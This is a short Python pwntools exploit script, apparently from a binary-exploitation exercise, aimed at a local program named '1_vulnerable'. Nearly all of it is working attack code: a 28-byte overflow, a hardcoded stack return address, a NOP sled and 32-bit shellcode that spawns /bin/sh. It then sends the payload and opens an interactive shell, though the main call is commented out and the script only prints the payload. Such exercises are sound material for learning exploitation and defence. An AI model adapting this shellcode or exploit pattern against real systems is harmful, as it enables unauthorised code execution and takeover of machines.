#!/usr/bin/python

from pwn import *

def create_exploit():
    # Create payload
    overflow = 'A' * 28
    # 0xffffcd40 start buffer
    ret_address = 0xffffcd40 + len(overflow) + 4 # 4 to get the next address
    # ret_address = 0xffffce18

    # nop_sleed = '\x90' * 20
    
    # log.info('Return address: ' + hex(id(ret_address)))
    # /bin/sh
    shellcode = ('\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b' +
                 '\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd' +
                 '\x80\xe8\xdc\xff\xff\xff/bin/sh')

    # padding_len = 100 - len(overflow) - 4 - len(shellcode)
    padding = '\x90' * 100
    # exploit
    payload = overflow + p32(ret_address) + padding + shellcode

    return payload

def main():
    # Start a process
    p = process('./1_vulnerable')

    payload = create_exploit()

    # Print process id and wait for enter
    # Get the pid and attach in gdb
    raw_input(str(p.proc.pid))
    
    # Send
    p.send(payload)
    p.interactive()

#main()
print(create_exploit())
